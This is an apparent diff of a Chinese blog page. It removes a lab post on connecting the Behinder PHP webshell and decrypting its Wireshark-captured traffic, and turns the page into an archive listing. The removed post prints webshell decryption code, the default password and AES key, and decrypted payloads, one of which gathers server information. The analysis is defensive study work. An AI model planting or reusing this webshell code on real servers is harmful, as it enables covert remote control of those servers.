@@ -6,22 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>冰蝎02-基本连接及Wireshark抓包 | HSmiling&#39;s Blog</title>
+  <title>Archives: 2021/11 | HSmiling&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="冰蝎的基本连接，针对php类型报文进行具体分析">
-<meta property="og:type" content="article">
-<meta property="og:title" content="冰蝎02-基本连接及Wireshark抓包">
-<meta property="og:url" content="http://example.com/2021/08/25/02WEEK1%E5%86%B0%E8%9D%8E%EF%BC%9A%E5%9F%BA%E6%9C%AC%E8%BF%9E%E6%8E%A5%E5%8F%8AWireshark%E6%8A%93%E5%8C%85/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="HSmiling&#39;s Blog">
+<meta property="og:url" content="http://example.com/archives/2021/11/index.html">
 <meta property="og:site_name" content="HSmiling&#39;s Blog">
-<meta property="og:description" content="冰蝎的基本连接，针对php类型报文进行具体分析">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://111.30.35.172:9443/GR2021/hack_tool/src/branch/master/%e6%9d%8e%e6%b3%93%e4%b8%80/image/image-20210823103128151.png">
-<meta property="article:published_time" content="2021-08-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-11-09T08:44:04.140Z">
 <meta property="article:author" content="HSmiling">
-<meta property="article:tag" content="实训笔记">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://111.30.35.172:9443/GR2021/hack_tool/src/branch/master/%e6%9d%8e%e6%b3%93%e4%b8%80/image/image-20210823103128151.png">
   
     <link rel="alternative" href="/atom.xml" title="HSmiling&#39;s Blog" type="application/atom+xml">
   
@@ -145,368 +138,49 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-02WEEK1冰蝎：基本连接及Wireshark抓包" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      冰蝎02-基本连接及Wireshark抓包
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2021" class="archive-year">2021</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2021/11/10/Hexo%20%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/" class="archive-article-date">
+  	<time datetime="2021-11-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-10</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2021/11/10/Hexo%20%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/">hexo博客初识</a>
     </h1>
   
 
-        
-        <a href="/2021/08/25/02WEEK1%E5%86%B0%E8%9D%8E%EF%BC%9A%E5%9F%BA%E6%9C%AC%E8%BF%9E%E6%8E%A5%E5%8F%8AWireshark%E6%8A%93%E5%8C%85/" class="archive-article-date">
-  	<time datetime="2021-08-24T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>冰蝎的基本连接，针对php类型报文进行具体分析</p>
-<span id="more"></span>
+        <div class="article-info info-on-right">
+          
+          
 
-<h1 id="冰蝎的基本连接"><a href="#冰蝎的基本连接" class="headerlink" title="冰蝎的基本连接"></a>冰蝎的基本连接</h1><h2 id="xshell连接"><a href="#xshell连接" class="headerlink" title="xshell连接"></a>xshell连接</h2><p>保持虚拟机开机状态下，打开Xshell进行连接，使用root权限在命令行中键入如下命令，在虚拟机中进行shell.php的搭建：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo gedit/www/wwwroot/192.168.121.134/shell.php</span><br></pre></td></tr></table></figure>
-
-<p>将冰蝎工具文件夹/server/shell.php中内容进行相应复制。</p>
-<h2 id="Wireshark的配备"><a href="#Wireshark的配备" class="headerlink" title="Wireshark的配备"></a>Wireshark的配备</h2><p>打开Wireshark，按照虚拟机的ip地址选择相应接口，开启抓包</p>
-<h2 id="连接冰蝎"><a href="#连接冰蝎" class="headerlink" title="连接冰蝎"></a>连接冰蝎</h2><p>在冰蝎的网站列表中新建一条：</p>
-<blockquote>
-<p>URL: <a target="_blank" rel="noopener" href="http://192.168.121.134/shell.php">http://192.168.121.134/shell.php</a></p>
-<p>密码: rebeyond</p>
-</blockquote>
-<p>点击右键打开改条新建信息,连接成功.</p>
-<h2 id="问题与思考"><a href="#问题与思考" class="headerlink" title="问题与思考"></a>问题与思考</h2><ul>
-<li><p>Problem1: 第一次冰蝎连接显示失败，其主要原因在于密码输入不正确。</p>
-<p><strong>思考</strong></p>
-<p>冰蝎3.0的AES秘钥为连接密码32位md5值的前16位，默认连接密码为rebeyond。当需要使用其他密码进行连接时,需要使用md5sum命令生成md5值，其命令如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum filename #连接密码为32位md5值的前16位</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h1 id="Wireshark抓包流量分析及还原"><a href="#Wireshark抓包流量分析及还原" class="headerlink" title="Wireshark抓包流量分析及还原"></a>Wireshark抓包流量分析及还原</h1><h2 id="Wireshark基本参数"><a href="#Wireshark基本参数" class="headerlink" title="Wireshark基本参数"></a>Wireshark基本参数</h2><p>将遇到的一些不熟悉的参数含义罗列如下：</p>
-<table>
-<thead>
-<tr>
-<th align="center">参数</th>
-<th align="center">内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Content-type</td>
-<td align="center">请求和响应中的媒体类型信息，用于定义网络文件类型和网页编码</td>
-</tr>
-<tr>
-<td align="center">Referer</td>
-<td align="center">http请求中header一部分，可用于防盗链及防止恶意请求</td>
-</tr>
-<tr>
-<td align="center">Cookie</td>
-<td align="center">存在用户本地终端上，与session一起作用于身份认证</td>
-</tr>
-<tr>
-<td align="center">Cache-Control</td>
-<td align="center">HTTP中关于缓存的响应头，由响应资源缓存指令组成</td>
-</tr>
-</tbody></table>
-<h2 id="shell-php程序解读"><a href="#shell-php程序解读" class="headerlink" title="shell.php程序解读"></a>shell.php程序解读</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=openssl_decrypt(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>该段代码的含义为：openssl扩展并未加载时，则先对报文进行base64解密，而后进行异或；否则，则进行AES128解码，此时的密钥为e45e329feb5d925b</p>
-<h2 id="TCP流解密过程"><a href="#TCP流解密过程" class="headerlink" title="TCP流解密过程"></a>TCP流解密过程</h2><blockquote>
-<p>冰蝎加密流程</p>
-<p>参考博客：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2774">利用动态二进制加密实现新型一句话木马之PHP篇 - 先知社区 (aliyun.com)</a></p>
-<p>我将冰蝎的加密过程转述为以下4个步骤进行：</p>
-<ol>
-<li>客户端向服务端进行请求</li>
-<li>服务端随机产生密钥，将其写入session中，并将密钥返回至客户端</li>
-<li>客户端获取密钥并对payload进行加密，发送至服务端</li>
-<li>服务端对payload进行解密，并执行payload，交给客户端获取运行结果</li>
-</ol>
-</blockquote>
-<p>结合冰蝎的加密原理，在shell.php中已给出AES的密钥为：e45e329feb5d925b，对Wireshark中的TCP流进行分析：</p>
-<h3 id="步骤1：第一次POST请求"><a href="#步骤1：第一次POST请求" class="headerlink" title="步骤1：第一次POST请求"></a>步骤1：第一次POST请求</h3><ul>
-<li>客户端(192.168.121.1)向服务端（192.168.121.134）发送POST请求</li>
-</ul>
-<p>观察到cookie值为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=f99lvs2vhfsvje3hlf92r56e2v</span><br></pre></td></tr></table></figure>
-
-<p>通过Content-length得到，该加密报文长度为2432.此时后面的乱码为加密后的AES信息</p>
-<ul>
-<li><p>POST报文解密</p>
-<p>根据2.2中的代码解读，使用AES解密（密钥为：e45e329feb5d925b），再使用base64进行解码，得到代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line">function main($content)</span><br><span class="line">&#123;</span><br><span class="line">	$result = array();</span><br><span class="line">	$result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode($content);</span><br><span class="line">    $key = $_SESSION[&#x27;k&#x27;];</span><br><span class="line">    echo encrypt(json_encode($result),$key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$content=&quot;T3lXck5sTTk3cHZBN1NKamJMbHA1bHRIUzRkdGNSSHNVbEZJakdlR2ZtZmR2ZnVHZkpwTkE1U3plR0xvVHVQRVRhckdra0lmZ0pYcTdvT3pYVWQxNm9aWXZod0RxSTE4WXNqdVVVVUJQMkRiRG1MUnRCeE52WjV4TVY3cUJVVzlGR2RLWW40c2ZkNDFCWDN5aHNQVGduTTNzMlNaY2pkcVBDRlNPWEI5NDVoV05nNHRJSG1RbWZnVWVkcnVya1lNU0lkM2lQOGJ4ZWxvNWlvdlo3QXRqNHY0RFdOTmFpSXp4TjcxQVlYMW1USDgzc1NaWGFzYjdJS1B3anUxNWhncVZ2OTA2dk83ZWxhbVh0OXB2a1p4Z282bGtBUUlJeUE4bmU4b2l4ZjZGaDl1S1NQQ1VqRFlrTm1uYzFKOG5aVWZoUW1kSXY2ZkdFbmtkVWFobFhjSEpjUVdSc2xTWDJwNUdQWkdNdFJlUnNkNXFsOHFOMmtxdjJDSmdWYnd5UElUYmgwQ0tJTEdhZXBtU3FsVVhlQ1hPbHlLaXBzNlhIZkR0OWpCd0RieVdnZThmeTN2bm10WjZLWUUzb3Jib1ZrclBCdWZPZWphWmthYjRIZlVRYzVRMjg0bU5xbERrTVd4S3BzOEszQlBURzlKcjFMRVVxS1RwMkZicFdhRTVaRVhyejRYWGZha1A5V1c1YmdLTThWaXJMNXZKeVVOSmpHQlZSbzZ2dVY0a3pBVGduemJVQU9UYjJs&quot;;$content=base64_decode($content);</span><br><span class="line">main($content);</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="步骤2：服务器第一次响应"><a href="#步骤2：服务器第一次响应" class="headerlink" title="步骤2：服务器第一次响应"></a>步骤2：服务器第一次响应</h3><p>​    通过报文观察到以下主要变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Encoding: gzip</span><br></pre></td></tr></table></figure>
-
-<p>即报文内容已被压缩，且为chunked编码。在这里将其转换为原始编码，通过对http编码的解读，截取原始信息。</p>
-<p>使用16进制转换+zip解码+AES解密（密钥为e45e329feb5d925b）</p>
-<p>得到解密信息如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;T3lXck5sTTk3cHZBN1NKamJMbHA1bHRIUzRkdGNSSHNVbEZJakdlR2ZtZmR2ZnVHZkpwTkE1U3plR0xvVHVQRVRhckdra0lmZ0pYcTdvT3pYVWQxNm9aWXZod0RxSTE4WXNqdVVVVUJQMkRiRG1MUnRCeE52WjV4TVY3cUJVVzlGR2RLWW40c2ZkNDFCWDN5aHNQVGduTTNzMlNaY2pkcVBDRlNPWEI5NDVoV05nNHRJSG1RbWZnVWVkcnVya1lNU0lkM2lQOGJ4ZWxvNWlvdlo3QXRqNHY0RFdOTmFpSXp4TjcxQVlYMW1USDgzc1NaWGFzYjdJS1B3anUxNWhncVZ2OTA2dk83ZWxhbVh0OXB2a1p4Z282bGtBUUlJeUE4bmU4b2l4ZjZGaDl1S1NQQ1VqRFlrTm1uYzFKOG5aVWZoUW1kSXY2ZkdFbmtkVWFobFhjSEpjUVdSc2xTWDJwNUdQWkdNdFJlUnNkNXFsOHFOMmtxdjJDSmdWYnd5UElUYmgwQ0tJTEdhZXBtU3FsVVhlQ1hPbHlLaXBzNlhIZkR0OWpCd0RieVdnZThmeTN2bm10WjZLWUUzb3Jib1ZrclBCdWZPZWphWmthYjRIZlVRYzVRMjg0bU5xbERrTVd4S3BzOEszQlBURzlKcjFMRVVxS1RwMkZicFdhRTVaRVhyejRYWGZha1A5V1c1YmdLTThWaXJMNXZKeVVOSmpHQlZSbzZ2dVY0a3pBVGduemJVQU9UYjJs&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p><strong>“status”</strong></p>
-<p>其中status的值通过base64解码得到为“success”，即表示状态为正常，</p>
-</li>
-<li><p><strong>“msg”</strong></p>
-</li>
-</ol>
-<p>msg为回显值，按照第一份报文解密得到的代码，对content数值进行一次base加密和解密后的数值，可以观察到其与content内容一致</p>
-<h3 id="步骤3：第二次POST请求"><a href="#步骤3：第二次POST请求" class="headerlink" title="步骤3：第二次POST请求"></a>步骤3：第二次POST请求</h3><ul>
-<li><p>post密文解密</p>
-<p>根据2.2中的代码解读，使用AES解密（密钥为：e45e329feb5d925b），再使用base64进行解码，得到代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">function main($whatever) &#123;</span><br><span class="line">    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();</span><br><span class="line">    $driveList =&quot;&quot;;</span><br><span class="line">    if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        for($i=65;$i&lt;=90;$i++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		$drive=chr($i).&#x27;:/&#x27;;</span><br><span class="line">    		file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&#x27;&#x27;;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$driveList=&quot;/&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">    $currentPath=getcwd();</span><br><span class="line">    //echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList;</span><br><span class="line">    $osInfo=PHP_OS;</span><br><span class="line">    $arch=&quot;64&quot;;</span><br><span class="line">    if (PHP_INT_SIZE == 4) &#123;</span><br><span class="line">        $arch = &quot;32&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo),&quot;arch&quot;=&gt;base64_encode($arch));</span><br><span class="line">    //echo json_encode($result);</span><br><span class="line">    session_start();</span><br><span class="line">    $key=$_SESSION[&#x27;k&#x27;];</span><br><span class="line">    //echo json_encode($result);</span><br><span class="line">    //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);</span><br><span class="line">    echo encrypt(json_encode($result), $key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$whatever=&quot;SlBSUWY3c2l4VFRLSUVMRjFKV2l6c2N5T1JzMG5PeEQ3cHBzTkNjUThNUVdJYkxDQWVCdE5pemRxTlJVVGdCcTl1WHpQV3Ixdk9IQnRqRDFuaDB3NE0wbFB5Z1ROUU15UlYyS1o3SVRhcVpGVUl0bXFKQXF2ZDRlUnJnNkdtYnpXMkZ4MnpTaWI1d0k5Q0FGcHZMMUh2QkoyalVINXd1MjVLWjg2QU5Xa3ZOR1hmZWg2MVBSeldINGlmS2pqNlNkQThBVm1VdHlWRHBwMmM1YUF5NkY2bHM1N1M5N0JqbjJzZUMwMnR6UDh3cVhYemMwMFhVZURXM3BUa0QzcVpaaFE1T1lUZ21qSXJLb3JLOHNhWFY3VllOVXVTbUtnUXhpTWI1R2NmR2dkbGF3ZlRTZ2paNHdUaWtnOW1UTktTeHVwNWM1Y3NOaVlTemRXbTdNMUc2cTdXUXpyVTFDS2pXRXh2UmxLZFpRZFRMcURGUklzRWxpRzhBZVdZTnFyMlk2d0JZeFBlVlMwMkZZVGxRWmtrelFrUjZWdHVGZ1RMWm9HdWxhNGlpMnVoTjFQaTRybEZIaElyOEdlVFZKTGNTMlppcjIwQkkxemtrYVljWklBWklVS1FYaU1OMVh2Zm9TMTlNSUFyVkJ1WnJ2cnRlM2YyeFdmNHF6eEJwak04VmR3VzZSbVl0VXF2NlY1Vno2NUxTTk8zelhnZ2plaUFwRmdPcENMMEY4UnlsSk9mQlR1eW52T1hRaDVhd01HM2pZN0JNN2IxNHV2SE5tRmpNQmowaFJBR1d0dXdVdTlNYnROMVJpaGlRU3NiTmdxWlNBV3FQYk5MN0xSc2tVVVMwNk9tamRONzRFZTFQZlVWNmNHQVpyOFlpQzBLbDV3QWlNRUZRZklTWVZSUmdEdFJxT1poUnhXQkUyYmVIbVRhTEhMVGhDNlBFYlhZTTFBVURHVHJ1MGdOTGI2MGN5ZmhTbnBzNXU0bzdxU01ZVnVtSDhNbWpiMVVwR3I3QkNQSDB4cHEwVUFVUHpJRGxUU25JaVZuM3JvZDZ6cjVIMHZKeHNKb2xaNWpkZ3l2VnlBZjNyQVRtVWZZUFVVWkJZVFliRlllUzBrYjNobnY0Y0FHekdNZUV6UmRXNGZtOVpXQ1BGUElWSTZ3SlZsZlhoRHh3bQ==&quot;;$whatever=base64_decode($whatever);</span><br><span class="line">main($whatever);</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="步骤4：服务器第二次响应"><a href="#步骤4：服务器第二次响应" class="headerlink" title="步骤4：服务器第二次响应"></a>步骤4：服务器第二次响应</h3><p>同步骤二的解密过程一致，通过转换为原始编码，通过对http编码的解读，截取原始信息。并使用16进制转换+zip解码+AES解密（密钥为e45e329feb5d925b）</p>
-<blockquote>
-<p>注意：这里的响应报文较长，需要使用分块传输，故在zip解码时需要对原始信息进行一定处理</p>
-</blockquote>
-<p>得到解密信息中含有”basicInfo”,”driveList”,”currentPath”,”osInfo”,”arch”的值，由于basicInfo字段太多，在这里不予以展开，其余数值如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;driveList&quot;:&quot;Lw==&quot;,&quot;currentPath&quot;:&quot;L3Zhci93d3cvaHRtbA==&quot;,&quot;osInfo&quot;:&quot;TGludXg=&quot;,&quot;arch&quot;:&quot;NjQ=&quot;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p><strong>“driveList”</strong></p>
-<p>通过base64解码，得到其值为“/”，即根据上述代码，说明stristr(PHP_OS,”windows”)||stristr(PHP_OS,”winnt”)条件为否，即php预定义常量PHP_OS中不包含字符串“windows”和“winnt”</p>
-</li>
-<li><p><strong>“currentPath”</strong></p>
-<p>通过base64解码，得到其值为“/var/www/html”，即为当前的工作目录</p>
-</li>
-<li><p><strong>“osInfo”</strong></p>
-<p>解码后为“Linux”，即为服务器的操作系统</p>
-</li>
-<li><p><strong>“arch”</strong></p>
-<p>解码后值为“64”，可由上述代码得到</p>
-</li>
-<li><p><strong>“basicInfo”</strong></p>
-<p>运用base64解码，得到phpinfo页面的源代码，通过将得到的数据存入html文件并运用浏览器打开，可以看到冰蝎连接成功的页面</p>
-</li>
-</ol>
-<h2 id="报文分析"><a href="#报文分析" class="headerlink" title="报文分析"></a>报文分析</h2><p>在2.3节中将四次报文的内容进行解密及基本梳理，现将基本过程梳理如下：</p>
-<ul>
-<li><p>第一次请求与响应中主要是对连接进行确认，其中进行基本回显；而第二次回显的内容中，将网页的基本信息和服务器的基本信息进行了一定回显，我们可以得到表格如下：</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>客户端</th>
-<th>服务端</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>第一次请求与响应</td>
-<td>相关函数和参数（其中包括加密方式）</td>
-<td>content信息回显，status状态</td>
-</tr>
-<tr>
-<td>第二次请求与响应</td>
-<td>相关函数和参数（其中包括加密方式）</td>
-<td>basicinfo页面具体信息，osInfo服务器操作系统，currentPath当前工作目录，及其他相关参数</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>可以观察到两次请求均有共同函数如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>该函数用于对输入的参数data运用key值进行加密，其加密方式根据判断openssl库决定。</p>
-</li>
-</ul>
-<h2 id="问题与思考-1"><a href="#问题与思考-1" class="headerlink" title="问题与思考"></a>问题与思考</h2><ul>
-<li><p><strong>Problem1</strong>：在博客阅读中，发现有博主抓包的结果是通过GET方法请求服务器密钥，而相关资料中也有GET请求密钥原理的阐述；而在实际操作中，抓包结果反馈是使用POST，并没有GET方法的请求密钥过程。思考二者有什么区别？</p>
-<p><strong>思考</strong></p>
-<p>GET请求主要用于获取数据，而POST请求用于提交数据。根据冰蝎加密原理，客户端在密钥协商阶段通过GET请求服务器密钥，此时密钥的长度应为16；而我的抓包结果中的POST请求是因为键入了命令操作，进行相关文件的访问。</p>
-<p>原因猜测：在阅读相关博客后，猜测可能与冰蝎版本有关，旧版本需要交换AES密钥，而在新版本的shell.php中直接写死，第一个包直接为加密数据</p>
-</li>
-<li><p><strong>Problem2</strong>：第二段响应报文在按照第二段报文进行Gunzip显示解码时，出现Gunzip - invalid CRC-32 checksum: 0xe237c8e / 0x7598879d的报错</p>
-<p><strong>解决方法</strong></p>
-<p>第二段响应报文由于较长，其中报文的传输是分块的，仔细观察报文其中会出现如下情况：</p>
-<p>![image-20210823102839458](<a target="_blank" rel="noopener" href="https://111.30.35.172:9443/GR2021/hack_tool/src/branch/master/%E6%9D%8E%E6%B3%93%E4%B8%80/image/image-20210823102839458.png">GR2021/hack_tool: 黑客工具分析 - 李泓一/image/image-20210823102839458.png at master - hack_tool - Gitea</a>)</p>
-<p>故需要对“3000”这种情况的出现，进行一定的报文原始编码处理，找到其中出现0d0axxxxxxxx0d0a这种情况，并将其删除。如下图所示</p>
-<p><img src="https://111.30.35.172:9443/GR2021/hack_tool/src/branch/master/%e6%9d%8e%e6%b3%93%e4%b8%80/image/image-20210823103128151.png" alt="image-20210823103128151"></p>
-<p><strong>思考</strong></p>
-<p>校验码出错，可能原因是在原始编码中截取的数字存在一定问题。故能够通过进一步查找截取数字的方式进行问题查找，而出现这一问题的原因在于对chunked编码方式不熟悉。</p>
-</li>
-</ul>
-<h1 id="参考资料及工具"><a href="#参考资料及工具" class="headerlink" title="参考资料及工具"></a>参考资料及工具</h1><h2 id="解密工具"><a href="#解密工具" class="headerlink" title="解密工具"></a>解密工具</h2><ul>
-<li>反混淆工具：<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef (gchq.github.io)</a></li>
-<li>AES解密网站<a target="_blank" rel="noopener" href="http://tools.bugscaner.com/cryptoaes/">http://tools.bugscaner.com/cryptoaes/</a></li>
-</ul>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
-<li><p>冰蝎流量分析</p>
-<p><a target="_blank" rel="noopener" href="https://www.136.la/shida/show-137063.html">记一次解密wireshark抓取的冰蝎通信流量_136.la</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48776804/article/details/117329120">(2条消息) 冰蝎的流量分析_wx_7782175678的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://liuyucishi.wang/liu-liang-fen-xi-zhi-bing-he-liu-liang-fen-xi/">流量分析之冰蝎流量分析 (liuyucishi.wang)</a></p>
-</li>
-<li><p>冰蝎的加密原理</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2774">利用动态二进制加密实现新型一句话木马之PHP篇 - 先知社区 (aliyun.com)</a></p>
-</li>
-<li><p>冰蝎的流量还原及报文解密</p>
